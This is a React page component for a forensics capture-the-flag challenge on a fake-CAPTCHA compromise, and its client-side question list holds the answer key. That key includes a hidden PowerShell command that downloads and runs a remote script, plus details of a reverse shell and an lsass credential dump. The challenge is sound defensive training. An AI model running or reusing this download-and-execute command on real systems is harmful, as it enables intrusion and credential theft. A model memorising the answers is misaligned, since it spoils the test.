import React, { useState } from 'react';
import { Link } from 'react-router-dom';
import { ArrowLeft, CheckCircle2, XCircle, HelpCircle, Download, User, Droplet, Trophy } from 'lucide-react';
import Confetti from 'react-confetti';

function HackedByCaptcha() {
  const [questions, setQuestions] = useState([
    {
      id: 1,
      text: '1. What is the first payload command?',
      answer: 'powershell -nop -W hidden -noni -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString(\'http://172.20.120.18/help.ps1\')"',
      hint: 'The first payload command was executed via the Run dialog (Win + R).',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 2,
      text: '2. When was the command executed?',
      answer: '2025-02-23 14:41:17',
      hint: 'Check the registry key that stores a history of recently executed commands.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 3,
      text: '3. What is the name of the second payload script?',
      answer: 'help.ps1',
      hint: 'The first payload command downloads and executes a script. Identify the name of this script from the command.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 4,
      text: '4. What is the MD5 hash of the script?',
      answer: '51255D9A05327984236A91F11A196298',
      hint: 'If the script was transferred over the network, you can use a tool like Wireshark to capture the traffic and extract the file.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 5,
      text: '5. What is the attacker\'s IP address?',
      answer: '172.20.120.18',
      hint: 'Check the script\'s content.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 6,
      text: '6. What port did the attacker use as a listener?',
      answer: '4444',
      hint: 'Check the script\'s content.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 7,
      text: '7. What type of attack was launched?',
      answer: 'Reverse shell',
      hint: 'The attacker used a technique to gain remote access to the compromised system. Think about the nature of the connection established.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 8,
      text: '8. What was the first command executed by the attacker?',
      answer: 'whoami',
      hint: 'After gaining access, attackers often run commands to gather information about the compromised system.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 9,
      text: '9. Which user got compromised?',
      answer: 'hackthehackers',
      hint: 'The compromised user is the account under which the malicious commands were executed.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 10,
      text: '10. What tool did the attacker use?',
      answer: 'procdump',
      hint: 'The attacker used a tool to extract sensitive information from the compromised system. It is often a legitimate tool abused for malicious purposes.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 11,
      text: '11. From which domain did the threat actor download the tool?',
      answer: 'sysinternals.com',
      hint: 'The domain is the source from which the attacker downloaded the tool.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
    {
      id: 12,
      text: '12. What was the target process of the attacker?',
      answer: 'lsass.exe',
      hint: 'The target process is a critical system process often targeted by attackers to extract sensitive information, such as credentials.',
      showHint: false,
      userAnswer: '',
      isCorrect: undefined,
    },
  ]);

  const [hintsRemaining, setHintsRemaining] = useState(3);
  const [showConfetti, setShowConfetti] = useState(false);
  const [showSuccess, setShowSuccess] = useState(false);
  const [showError, setShowError] = useState(false);

  const allQuestionsAnswered = questions.every((q) => q.isCorrect !== undefined);
  const correctAnswersCount = questions.filter((q) => q.isCorrect).length;
  const totalQuestions = questions.length;
  const progress = (correctAnswersCount / totalQuestions) * 100;

  const handleAnswerSubmit = (id, answer) => {
    setQuestions(
      questions.map((q) => {
        if (q.id === id) {
          return {
            ...q,
            userAnswer: answer,
            isCorrect: answer.toLowerCase() === q.answer.toLowerCase(),
          };
        }
        return q;
      })
    );
  };

  const toggleHint = (id) => {
    if (hintsRemaining > 0) {
      setQuestions(
        questions.map((q) => {
          if (q.id === id && !q.showHint) {
            setHintsRemaining(hintsRemaining - 1);
            return {
              ...q,
              showHint: true,
            };
          }
          return q;
        })
      );
    }
  };

  const handleComplete = () => {
    if (allQuestionsAnswered && correctAnswersCount === totalQuestions) {
      setShowConfetti(true);
      setShowSuccess(true);
      setShowError(false);
    } else {
      setShowError(true);
      setShowConfetti(false);
      setShowSuccess(false);
    }
  };

  return (
    <div className="min-h-screen bg-background text-white">
      <nav className="bg-primary-dark border-b border-primary-blue/20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between h-16 items-center">
            <div className="flex items-center space-x-4">
              <Link to="/challenges" className="text-primary-blue hover:text-primary-blue/80 flex items-center">
                <ArrowLeft className="w-5 h-5 mr-2" />
                Back to Challenges
              </Link>
            </div>
          </div>
        </div>
      </nav>

      <div className="flex justify-center mb-12">
        <div className="relative group">
          <div className="absolute inset-0 rounded-lg bg-primary-blue/40 blur-lg group-hover:opacity-100 opacity-0 transition-opacity duration-300"></div>
          <img
            src="/Challenges/HackedByCaptcha.png"
            alt="Hacked by CAPTCHA Challenge Banner"
            className="w-auto max-h-80 object-cover rounded-lg shadow-lg group-hover:scale-105 group-hover:rotate-1 transition-transform duration-300 ease-in-out relative z-10"
          />
        </div>
      </div>

      <div className="max-w-4xl mx-auto px-4 py-12 -mt-16 relative z-10">
        <h1 className="text-3xl font-bold mb-8">Hacked by CAPTCHA Challenge</h1>

        <div className="mb-6">
          <div className="text-lg font-semibold mb-2">Progress</div>
          <div className="w-full bg-primary-dark/20 h-4 rounded-full relative overflow-hidden">
            <div
              className="h-4 rounded-full transition-all duration-500 ease-in-out"
              style={{
                width: `${progress}%`,
                background: 'linear-gradient(90deg, #4ade80, #3b82f6)',
                boxShadow: '0 0 8px rgba(59, 130, 246, 0.6)',
              }}
            >
              <div className="text-center text-white text-sm font-semibold absolute inset-0 flex items-center justify-center">
                {`${Math.round(progress)}%`}
              </div>
            </div>
          </div>
          <div className="text-sm mt-2 text-gray-400">
            {correctAnswersCount} of {totalQuestions} correct
          </div>
        </div>

        <div className="text-gray-400 mb-6">
          Hints Remaining: {hintsRemaining}
        </div>

        <div className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20 mb-8">
          <h2 className="text-xl font-semibold mb-4">Challenge Introduction</h2>
          <p className="text-gray-400 mb-6">
            A user in your organization has been compromised. During the investigation, the SOC team discovered that the user interacted with a suspicious CAPTCHA page, which led to the execution of malicious commands. Your task is to analyze the incident and determine what happened.
          </p>
          <img
            src="/Challenges/HackedByCaptcha2.png"
            alt="Hacked by CAPTCHA Challenge Image"
            className="w-4/5 md:w-2/3 lg:w-1/2 mx-auto rounded-lg mb-6 border-4 border-primary-blue/20 shadow-lg hover:shadow-xl transition-shadow duration-300"
          />
        </div>

        <div className="text-center mb-8">
          <a
            href="/Challenges/HackedByCaptcha.7z"
            download="HackedByCaptcha.7z"
            className="bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 transition-all flex items-center justify-center space-x-2"
          >
            <Download className="w-5 h-5" />
            <span>Download Challenge Files</span>
          </a>
        </div>

        <div className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20 mb-8">
          <h2 className="text-xl font-semibold mb-4">Suggested Tools</h2>
          <p className="text-gray-400 mb-4">
            To analyze the incident, you can use the following tools:
          </p>
          <ul className="list-disc list-inside text-gray-400">
            <li>
              <a
                href="https://ericzimmerman.github.io/#!index.md"
                target="_blank"
                rel="noopener noreferrer"
                className="text-primary-blue hover:text-primary-blue/80"
              >
                Registry Explorer
              </a>{' '}
              - A tool for analyzing Windows registry files.
            </li>
            <li>
              <a
                href="https://www.wireshark.org/"
                target="_blank"
                rel="noopener noreferrer"
                className="text-primary-blue hover:text-primary-blue/80"
              >
                Wireshark
              </a>{' '}
              - A network protocol analyzer.
            </li>
          </ul>
        </div>

        <div className="space-y-6">
          {questions.map((question) => (
            <div
              key={question.id}
              className="bg-primary-dark/30 rounded-lg p-6 border border-primary-blue/20 hover:bg-primary-dark/40 hover:border-primary-blue transition-all"
            >
              <div className="flex items-start justify-between">
                <div className="flex-1">
                  <h3 className="text-lg font-semibold mb-4">{question.text}</h3>
                  <div className="flex items-center space-x-4">
                    <input
                      type="text"
                      className="bg-background border border-primary-blue/20 rounded-md px-4 py-2 focus:outline-none focus:border-primary-blue"
                      placeholder="Enter your answer"
                      value={question.userAnswer}
                      onChange={(e) =>
                        setQuestions(
                          questions.map((q) =>
                            q.id === question.id
                              ? { ...q, userAnswer: e.target.value }
                              : q
                          )
                        )
                      }
                    />
                    <button
                      className={`text-gray-500 hover:text-gray-400 transition-all ${
                        hintsRemaining === 0 ? 'opacity-50 cursor-not-allowed' : ''
                      }`}
                      onClick={() => toggleHint(question.id)}
                      disabled={hintsRemaining === 0}
                    >
                      <HelpCircle className="w-5 h-5" />
                    </button>
                    <button
                      className="bg-blue-600 text-white py-2 px-4 rounded-lg hover:bg-blue-700 active:scale-95 transition-all"
                      onClick={() => handleAnswerSubmit(question.id, question.userAnswer)}
                    >
                      Submit
                    </button>
                    {question.isCorrect !== undefined && (
                      question.isCorrect ? (
                        <CheckCircle2 className="w-6 h-6 text-green-500" />
                      ) : (
                        <XCircle className="w-6 h-6 text-red-500" />
                      )
                    )}
                  </div>
                  {question.showHint && (
                    <div className="mt-4 text-gray-300 italic">{question.hint}</div>
                  )}
                </div>
              </div>
            </div>
          ))}
        </div>

        {/* Complete Button */}
        <div className="max-w-4xl mx-auto px-4 mt-8 text-center">
          <button
            onClick={handleComplete}
            className="bg-green-600 text-white py-3 px-6 rounded-lg hover:bg-green-700 active:scale-95 transition-all flex items-center justify-center space-x-2"
          >
            <CheckCircle2 className="w-5 h-5" />
            <span>Complete Challenge</span>
          </button>

          {/* Error Message */}
          {showError && (
            <div className="mt-4 p-4 bg-red-600 text-white rounded-lg">
              <p>Please answer all questions correctly before completing the challenge.</p>
            </div>
          )}
        </div>

        {/* Success Message and Confetti */}
        {showSuccess && (
          <>
            <Confetti width={window.innerWidth} height={window.innerHeight} />
            <div className="max-w-4xl mx-auto px-4 mt-8 text-center">
              <div className="p-4 bg-green-600 text-white rounded-lg">
                <p className="text-lg font-semibold">Congratulations!</p>
                <p>You have completed the challenge with {correctAnswersCount} out of {totalQuestions} correct answers.</p>
              </div>
            </div>
          </>
        )}

        {/* Combined frame for Created by and First Blood */}
        <div className="max-w-4xl mx-auto px-4 mt-8">
          <div className="bg-primary-dark/40 p-6 rounded-xl border border-primary-blue/20 shadow-lg hover:shadow-xl transition-shadow duration-300">
            <div className="flex justify-center space-x-8">
              {/* Created by section */}
              <div className="flex items-center space-x-4">
                <div className="p-3 bg-primary-blue/10 rounded-full">
                  <User className="w-6 h-6 text-primary-blue" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">Created by:</p>
                  <div className="flex items-center space-x-2">
                    <p className="text-primary-blue hover:text-primary-blue/80 font-semibold">HackTheHackers</p>
                  </div>
                </div>
              </div>

              {/* Divider */}
              <div className="w-px bg-primary-blue/20 h-12"></div>

              {/* First Blood section */}
              <div className="flex items-center space-x-4">
                <div className="p-3 bg-red-500/10 rounded-full">
                  <Droplet className="w-6 h-6 text-red-500" />
                </div>
                <div>
                  <p className="text-gray-400 text-sm">First Blood:</p>
                  <div className="flex items-center space-x-2">
                    <Trophy className="w-5 h-5 text-yellow-500" />
                    <p className="text-red-500 hover:text-red-400 font-semibold">User</p>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      {/* Footer with Copyright */}
      <footer className="bg-primary-dark/30 text-white py-8 mt-8 border-t border-primary-blue/20">
        <div className="max-w-7xl mx-auto px-4 text-center">
          {/* Copyright notice */}
          <p className="text-gray-400">© 2025 HackTheHackers. All rights reserved.</p>
        </div>
      </footer>
    </div>
  );
}

export default HackedByCaptcha;
